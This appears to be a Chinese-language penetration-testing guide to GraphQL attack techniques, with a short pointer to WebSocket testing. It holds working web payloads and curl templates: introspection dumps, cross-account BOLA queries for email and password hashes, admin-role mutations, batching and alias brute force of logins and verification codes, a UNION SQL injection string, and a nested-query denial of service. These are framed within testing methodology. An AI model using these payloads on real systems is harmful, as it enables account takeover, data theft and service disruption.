---
name: graphql-websocket
description: GraphQL 与 WebSocket 是现代 Web 重要接入点, 传统 API 测试方法不完全适用。
category: vuln
---

# GraphQL / WebSocket 安全

> GraphQL 与 WebSocket 是现代 Web 重要接入点, 传统 API 测试方法不完全适用。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| `/graphql` / `/api/graphql` / `/graphiql` / `/playground` 200 | GraphQL 端点 | §一 §1.2 内省 |
| 响应 JSON 含 `errors` + `locations` 字段 | GraphQL 服务 | §一 |
| 内省查询返回 `__schema` | Schema 暴露 | §一 §1.3 mutation/越权 |
| WebSocket 升级 (`Upgrade: websocket`) | WS 接入点 | → [websocket-security.md](websocket-security.md) |
| `/socket.io/` / `/ws` / `/wss` | WebSocket 端点 | → [websocket-security.md](websocket-security.md) |
| WS 连接无认证 / Origin 不校验 | 跨站 WS / 越权 | → [websocket-security.md](websocket-security.md) |
| WS 消息 JSON 含敏感操作 | 业务越权可能 | → [websocket-security.md](websocket-security.md) |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 内省被禁但无 disable | 部分禁用 | 试 `__type(name:"User")` 单类型查询 |
| 嵌套查询返 502 / 超时 | DoS 限制 / 真挂了 | 评估深度,降级测试 |
| WS 连接立即关闭 | Origin/认证拦截 | 加 Origin Header / Cookie |
| Mutation 返 forbidden | 角色控制 | 试普通用户调管理 mutation (BFLA) |

GraphQL 方法见 §一; WebSocket 深测见 [websocket-security.md](websocket-security.md)。

### Attack Surface

- `/graphql`、GraphiQL/Playground、introspection、mutation、alias、batching、subscription。
- WebSocket 握手、Origin 校验、认证绑定、消息级权限和跨连接状态。
- GraphQL 与 REST/API 网关共用鉴权时的字段级越权、BOLA、BFLA。

### Pro Tips

- GraphQL 先识别 schema/字段建议, 再做低权限字段和 mutation 对照。
- WebSocket 先保存握手请求和消息样本, 再做 Origin/Token/租户切换。
- 批量查询、alias 和深层嵌套要控制请求规模, 避免 DoS 误伤。

### Evidence / Rating Boundary

- Introspection 或字段建议通常只是信息泄露/攻击面扩大。
- 高危需要证明跨账号读取、未授权 mutation、敏感订阅泄露或业务状态修改。
- WebSocket 漏洞必须保留握手、消息、响应和账号边界证据。
- 完整横向评级和最小证据包见 [graphql-websocket-evidence-boundaries.md](graphql-websocket-evidence-boundaries.md)。

### False Positive Gate

- GraphQL 200 + `errors` 是常见协议行为, 不是漏洞。
- Introspection 被关闭不代表安全; 但仅可访问登录页/IDE 也不等于漏洞。
- WS 连接失败、心跳响应或无状态 echo 不构成安全影响。完整误判过滤见 [graphql-websocket-evidence-boundaries.md](graphql-websocket-evidence-boundaries.md)。

---

## 一、GraphQL 安全

### 1.1 识别 GraphQL 端点

```
/graphql
/graphql/v1
/api/graphql
/graphiql           (交互 IDE)
/playground         (交互 IDE)
/voyager            (Schema 可视化)
/__graphql
/gql
```

批量探测:
```bash
for path in graphql graphql/v1 api/graphql graphiql playground voyager __graphql gql; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
    [ "$code" != "404" ] && echo "$path: $code"
done

# 识别 GraphQL 的响应特征
curl -s https://target.com/graphql -d '{"query":"{}"}' -H "Content-Type: application/json"
# 返回的 JSON 包含 "errors" + "locations" 即 GraphQL
```

### 1.2 内省查询 (Introspection)

```graphql
# 完整 Schema
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args {
          name
          type { name kind ofType { name kind } }
          defaultValue
        }
      }
    }
  }
}

# 简化版
{__schema{queryType{fields{name description}}}}

# 看 mutations
{__schema{mutationType{fields{name description}}}}
```

**curl 测试**:
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name}}}}}}}}"}'
```

### 1.3 工具

| 工具 | 用途 |
|------|------|
| **InQL** (Burp 插件) | Schema 提取 / mutation 生成 / 历史重放 |
| **GraphQL Voyager** | 可视化 Schema |
| **graphql-cop** | 自动化安全扫描 |
| **graphw00f** | 指纹识别(Apollo/Hasura/Yoga 等) |
| **clairvoyance** | 内省关闭时仍可枚举字段 |

### 1.4 攻击面清单

#### A. 内省未关闭
```graphql
# 如果内省没关, 整个 Schema 暴露
```

#### B. 内省关了但仍可枚举 (Clairvoyance)

即使 `__schema` 返回错误, 也可通过 **字段建议错误** (Did you mean) 逐字爆破字段:
```graphql
query { user(Id: 1) { idd } }
# 响应: "Cannot query field 'idd' on type 'User'. Did you mean 'id'?"
```

```bash
clairvoyance -u https://target.com/graphql -o schema.json
```

#### C. BOLA / 越权

```graphql
# A 账号查 B 的数据
query { user(id: "VICTIM_ID") { email phone orders { amount } } }
```

GraphQL 的对象级授权比 REST 更难做对, BOLA 是 GraphQL 最常见漏洞。

#### D. 嵌套查询 DoS

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { name }
          }
        }
      }
    }
  }
}
```

若每层 friends 返回 100 个 → 100^5 = 10 亿次解析 → DoS。

#### E. Mutation 越权

普通用户调用 admin mutations:
```graphql
mutation { deleteUser(id: "VICTIM") { success } }
mutation { updateUser(id: "VICTIM", input: {role: ADMIN}) { id } }
mutation { grantPermission(userId: "ATTACKER", permission: "ADMIN") { ok } }
```

#### F. Batching 攻击 (多查询绕过速率限制)

```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"3\") { token } }"},
  ...
]
```

一次请求几十个查询 → 绕过 "每分钟 10 次" 的限速。

#### G. Alias 爆破

```graphql
query {
  a1: login(user: "admin", pass: "pass1") { token }
  a2: login(user: "admin", pass: "pass2") { token }
  a3: login(user: "admin", pass: "pass3") { token }
  # ... 100 个
}
```

单个请求内用 alias 做千次尝试。

#### H. GraphQL SQL 注入

若 GraphQL resolver 拼接 SQL:
```graphql
query { users(filter: "id=1' UNION SELECT password FROM admins--") { name } }
```

#### I. Authorization Header 注入

```graphql
query { user(id: 1) { email } }
```
以不带 Token 的匿名请求, 看是否仍返回数据。

#### J. CSRF / GET 方式查询

```
GET /graphql?query={user(id:1){email}}
```
GET 方法若接受则可 CSRF。

#### K. 错误信息泄露

GraphQL 错误可能含堆栈/SQL/内部字段名:
```json
{"errors": [{"message": "SQL: SELECT * FROM users WHERE id='xx'", "path": ["user"]}]}
```

### 1.5 GraphQL 引擎识别 (graphw00f 指纹)

| 引擎 | 特征 |
|------|------|
| Apollo | `Cannot query field "blah"` 错误语法 |
| Hasura | `field "blah" not found in type: 'query_root'` |
| GraphQL Yoga | `Did you mean` 建议 |
| Sangria (Scala) | `Unknown argument` 语法 |
| Graphene (Python) | Python 风格错误 |
| Hotchocolate (.NET) | `Unknown field` + C# 风格 |

不同引擎在 Query complexity / 速率限制 / 内省等方面有不同默认值, 识别引擎 = 知道攻击方向。

### 1.6 PoC 模板

```bash
# 枚举 mutations
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}}"}'

# 尝试越权(BOLA)
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_A" \
  -d '{"query":"query { user(id: \"VICTIM_B_ID\") { email phone passwordHash } }"}'

# 批量(Batching)爆破
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(user:\"admin\", pass:\"p1\") { token } }"},
    {"query": "mutation { login(user:\"admin\", pass:\"p2\") { token } }"}
  ]'
```

### 1.7 Testing Checklist

- [ ] 识别 GraphQL 端点 (grep `/graphql`)
- [ ] 尝试内省查询
- [ ] 若关了, 用 clairvoyance 枚举字段
- [ ] 识别引擎(graphw00f)
- [ ] 枚举 queries / mutations / subscriptions
- [ ] BOLA: 用 A 账号查 B 的数据
- [ ] 匿名访问: 删除 Authorization 看响应
- [ ] 嵌套 DoS: 5-10 层 friends/comments
- [ ] Alias 爆破: 同一 query 多别名
- [ ] Batching: 数组请求绕过速率限制
- [ ] 错误信息: 尝试注入非法字段观察响应
- [ ] Mutation 越权: 普通用户调 admin 操作
- [ ] CSRF: 能否用 GET 触发 mutation

### 1.8 False Positive

GraphQL 误判过滤和评级边界见 [graphql-websocket-evidence-boundaries.md](graphql-websocket-evidence-boundaries.md)。本节只保留核心提醒: `errors`、字段建议、IDE 页面、空 schema、null 返回或单次超时都不能直接定级;必须证明账号边界、可调用接口或最终状态变化。

---

## 二、WebSocket 安全

WebSocket 识别、CSWSH、消息级注入、消息级越权和测试清单已迁移到 [websocket-security.md](websocket-security.md)。本文件只保留 GraphQL 主体和 GraphQL/WS 组合链入口。

---

## 三、组合攻击

### 3.1 GraphQL + BOLA + Alias 快速批量数据提取

```graphql
query {
  u1: user(id: "1") { email phone }
  u2: user(id: "2") { email phone }
  u3: user(id: "3") { email phone }
  # ... 用 alias 一次性拿数千用户
}
```

### 3.2 WS + XSS

WS 消息前端 innerHTML → 攻击者通过 CSWSH 发送 XSS payload → 自己触发 XSS。

### 3.3 GraphQL Batching + 爆破验证码

```json
[
  {"query": "mutation { verify(code: \"0000\") { ok } }"},
  {"query": "mutation { verify(code: \"0001\") { ok } }"},
  ...
  {"query": "mutation { verify(code: \"9999\") { ok } }"}
]
```

单请求内完成 10000 次尝试, 秒杀速率限制。

---

## 四、相关参考

| 内容 | 文件 |
|------|------|
| API 安全基础 | [../api-security.md](../api-security.md) |
| BOLA/IDOR | [../api-security.md](../api-security.md) §BOLA/IDOR |
| XSS(WS 消息常反射) | [xss.md](xss.md) |
| WebSocket 深测 | [websocket-security.md](websocket-security.md) |
| CSRF(类似 CSWSH) | [csrf-clickjacking.md](csrf-clickjacking.md) |
| SQL 注入 | [sqli.md](sqli.md) |

---

**CVSS 典型**: GraphQL BOLA 8.1 / CSWSH 8.1 / GraphQL DoS 5.3 / Batching 绕过速率 6.5
